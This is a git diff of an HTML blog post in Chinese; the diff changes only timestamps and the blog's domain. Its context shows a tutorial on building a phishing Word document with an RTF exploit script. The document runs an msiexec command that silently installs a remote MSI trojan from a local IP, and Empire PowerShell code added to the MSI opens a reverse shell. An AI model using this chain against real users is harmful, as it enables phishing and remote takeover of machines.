@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1566366592846">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1566523623045">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
 
@@ -36,7 +36,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://mari0er.github.io">
-        <img src="https://mari0er.github.io/images/avatar.png?v=1566366592846" class="site-logo">
+        <img src="https://mari0er.github.io/images/avatar.png?v=1566523623045" class="site-logo">
         <h1 class="site-title">Mari0er&#39;s Blog</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -123,7 +123,7 @@ C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;msiexec /q /i http://192.168.10.
 </code></pre>
 <p><strong>注意</strong>：Cmd需要以管理员身份运行，利用模板文件默认打开电脑计算器，若要执行其他命令请自行修改模板文件的第15行</p>
 <h2 id="0x03">0x03</h2>
-<p>  下面使用empire和上述的方法制作一份钓鱼文档。首先配置好empire，具体的配置内容可以参考<a href="https://mari0er.github.io/post/empire.html">这篇文章</a>,之后将生成的powershell代码复制粘贴到wix模板的第15行，替换之前打开计算器的代码，然后,用第二步的方法制作成msi文件，最后利用RTF脚本生成doc文件。此时打开Word文档就会远程执行下载和安装msi木马的命令，进一步运行powershell进行反弹。</p>
+<p>  下面使用empire和上述的方法制作一份钓鱼文档。首先配置好empire，具体的配置内容可以参考<a href="https://mari0er.club/post/empire.html">这篇文章</a>,之后将生成的powershell代码复制粘贴到wix模板的第15行，替换之前打开计算器的代码，然后,用第二步的方法制作成msi文件，最后利用RTF脚本生成doc文件。此时打开Word文档就会远程执行下载和安装msi木马的命令，进一步运行powershell进行反弹。</p>
 <pre><code>python RTF_11882_0802.py -c &quot;msiexec /q /i http://192.168.10.18/calc.msi&quot; -o test.doc -i test.rtf
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0202_empire.png" alt="empire"></p>
@@ -134,7 +134,7 @@ C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;msiexec /q /i http://192.168.10.
 <p>防护方法：1.及时打上微软推出的补丁 2.不要随意下载未知邮件里的文档，更不要随意打开并查看文档内容。</p>
 <blockquote>
 <p>本文作者： Mari0er<br>
-本文链接： https://mari0er.github.io/post/fishing.html<br>
+本文链接： https://mari0er.club/post/fishing.html<br>
 版权声明： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">BY-NC-SA</a> 许可协议。转载请注明出处！</p>
 </blockquote>
 
